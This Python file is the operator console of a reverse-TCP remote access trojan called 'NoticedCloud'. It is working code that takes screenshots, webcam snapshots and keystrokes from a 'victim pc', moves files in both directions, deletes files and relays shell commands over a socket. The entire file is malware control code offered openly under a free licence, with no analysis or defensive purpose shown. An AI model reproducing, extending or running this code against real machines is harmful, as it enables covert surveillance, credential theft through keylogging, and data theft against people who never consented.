"""
MIT License

Copyright (c) 2024 NoticedCloud348

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import socket
import os
import pickle
import cv2
from colorama import Fore
from time import sleep

from Lib.Debugger import info, error

class reverse_tcp:
    def GetFrame(self, st) -> None:
        st.send("screenshot".encode('utf-8'))
        info("Input sended")
        data: bytes = st.recv(4)

        info("First receive")
        lenght: int = int.from_bytes(data, byteorder='big')

        buffer: bytearray = bytearray(lenght)
        received: int = 0

        while received < lenght:
            chunk: bytes = st.recv(1024)
            buffer[received:received + len(chunk)] = chunk
            received += len(chunk)

        if received % 4 != 0:
            buffer.extend(b'\x00' * (4 - received % 4))

        name: str = input(Fore.GREEN + "[+]" + Fore.RESET + "file name > ")
        with open(f"{name}.png", "wb") as f:
            f.write(buffer)

    def GetWebcam(self, st) -> None:
        st.send("webcam_snap".encode('utf-8'))
        info("Input sended")

        data: bytes = st.recv(4)
        if data == "[+] ".encode():
            info("No webcam found")
            return

        lenght: int = int.from_bytes(data, byteorder='big')

        buffer: bytearray = bytearray(lenght)

        received: int = 0
        while received < lenght:
            chunk: bytes = st.recv(1024)
            buffer[received:received + len(chunk)] = chunk
            received += len(chunk)

        frame: dict = pickle.loads(buffer)
        name: str = input(Fore.GREEN + "[+]" + Fore.RESET + "file name > ")
        try:
            cv2.imwrite(f"{name}.jpg", frame)
        except Exception as e:
            error("Error while writing file, probably due to a deactivated webcam in the client side")

    def GetKeyboard(self, st) -> None:
        st.send("keyboard_snap".encode('utf-8'))
        self.__Close = False
        while True:
            try:
                if self.__Close:
                    self.__Close = False
                    return
                a: str = st.recv(1024).decode()

                if not os.path.isfile("keyboard.txt"):
                    with open("keyboard.txt", "w") as f:
                        pass

                with open("keyboard.txt", "a") as f:
                    f.write("\n" + a)
            except KeyboardInterrupt:
                self.__Close = True

    def do_screenshot(self, conn, command=None):
        self.GetFrame(conn)

    def do_webcam_snap(self, conn, command=None):
        self.GetWebcam(conn)

    def do_keyboard_snap(self, conn, command=None):
        self.GetKeyboard(conn)

    def do_quit(self, conn, command=None):
        conn.send("quit".encode())
        sleep(1)
        conn.close()

    def do_close(self, conn, command=None):
        conn.close()

    def do_help(self, conn=None, command=None):
        print("""
screenshot: takes a screenshot in the victim pc
webcam_snap: takes a webcam snapshot in the victim pc
keyboard_snap: takes the keys that are pressed on the victim pc
ls: prints all the files and directories
getcwd: get the current working directory
cd: It allows you to move through folders, example cd Folder
rm: It allows you to delete a file or a directory, example rm file
create_file: It allows you to create a file with a name and a content, example create_file file.txt hello
get_info: It gives you information about the victim pc
close: Closes the connection without closing the client
quit: quit the application
""")

    def do_download(self, conn, command):
        parts = command.split()
        if len(parts) < 2:
            print("Filename missing")
            return
        file_name = parts[1]
        conn.send(command.encode())

        with open(file_name, "wb") as f:
            while True:
                file_data = conn.recv(1024)
                conn.sendall(b"r")

                if not file_data:
                    break

                f.write(file_data)

    def do_upload(self, conn, command):
        parts = command.split()
        if len(parts) < 2:
            print("Filename missing")
            return
        file_name = parts[1]
        conn.send(command.encode())

        with open(file_name, "rb") as f:
            while True:
                file_data = f.read(1024)
                if not file_data:
                    break
                conn.sendall(file_data)
                conn.recv(1024)

    def run(self, conn: socket.socket, addr) -> None:
        if conn is None:
            return

        command_map = {
            'screenshot': self.do_screenshot,
            'webcam_snap': self.do_webcam_snap,
            'keyboard_snap': self.do_keyboard_snap,
            'quit': self.do_quit,
            'close': self.do_close,
            'help': self.do_help,
            'download': self.do_download,
            'upload': self.do_upload,
        }

        while True:
            try:
                command = input("NoticedCloud >> ").strip()
                if not command:
                    continue

                cmd_key = command.split()[0]

                if cmd_key in command_map:
                    if cmd_key in ['download', 'upload']:
                        command_map[cmd_key](conn, command)
                    else:
                        command_map[cmd_key](conn)
                    if cmd_key in ['quit', 'close']:
                        break
                else:
                    conn.send(command.encode('utf-8'))
                    result = conn.recv(1024).decode('utf-8')
                    if result == "Unknown command":
                        error(result, "\nWrite help to view the commands")
                    else:
                        print(result)

            except KeyboardInterrupt:
                print("")
                break
